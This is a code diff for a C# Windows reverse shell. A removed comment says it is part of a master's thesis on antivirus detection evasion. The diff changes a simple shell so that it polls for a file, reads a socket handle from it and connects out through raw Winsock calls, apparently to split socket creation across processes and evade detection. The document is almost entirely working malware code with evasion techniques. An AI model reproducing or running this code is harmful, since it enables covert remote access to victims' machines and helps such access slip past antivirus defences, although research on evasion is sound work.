@@ -1,22 +1,31 @@
-﻿///----------------------------------------------------------------------------------------------------------------------------------------------------------------------
-/// This implementation is part of my master's thesis regarding antivirus detection evasion. 
-///  C Vorlage: https://github.com/izenynn/c-reverse-shell/blob/main/windows.c
-///  C# Beispiel für Structs: https://pastebin.com/twvGw030
-///----------------------------------------------------------------------------------------------------------------------------------------------------------------------
-namespace SimpleReverseShell
+﻿using System.Net.Sockets;
+using System.Runtime.InteropServices;
+using Win32Imports;
+
+namespace EvasiveShell_SocketReader
 {
-  using System.Net.Sockets;
-  using System.Runtime.InteropServices;
-  using Win32Imports;
-
-  internal class SimpleSysCallShell : DllImportsBase
+  internal class Program : DllImportsBase
   {
-    public void Start()
+    static void Main(string[] args)
     {
-      var wsa = new WSAData();
-      var statusCode = WSAStartup((ushort)2.2, wsa);
+      Helpers.InitializeWSA();
 
-      Helpers.PrintLastError(nameof(WSAStartup));
+      var filePath = @"F:\FH_Technikum_Wien\Masterarbeit\SimpleReverseShell\EvasiveShell\bin\Debug\net6.0\socketconfig.bin";
+
+      do
+      {
+        Thread.Sleep(1000);
+      }
+      while (!File.Exists(filePath));
+
+      IntPtr socket;
+
+      using (var fs = File.Open(filePath, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.Read))
+      using (var br = new BinaryReader(fs))
+      {
+        var value = br.ReadInt64();
+        socket = new IntPtr(value);
+      }
 
       var sockAddrIn = new sockaddr_in();
       sockAddrIn.sin_family = 2;
@@ -28,15 +37,13 @@ namespace SimpleReverseShell
 
       var sockAddrInPtr = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddrIn));
       Marshal.StructureToPtr(sockAddrIn, sockAddrInPtr, false);
-
       var sockAddr = Marshal.PtrToStructure<sockaddr>(sockAddrInPtr);
 
-      var socket = WSASocketA(2, 1, 6, IntPtr.Zero, 0, 0);
-      Helpers.PrintLastError(nameof(WSASocketA));
 
       var addrPointer = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddr));
       Marshal.StructureToPtr(sockAddr, addrPointer, false);
-      var connectSuccess = connect(socket, sockAddrInPtr, Marshal.SizeOf(sockAddrIn));
+
+      connect(socket, sockAddrInPtr, Marshal.SizeOf(sockAddrIn));
       Helpers.PrintLastError(nameof(connect));
 
       var socketHandle = new SafeSocketHandle(socket, false);
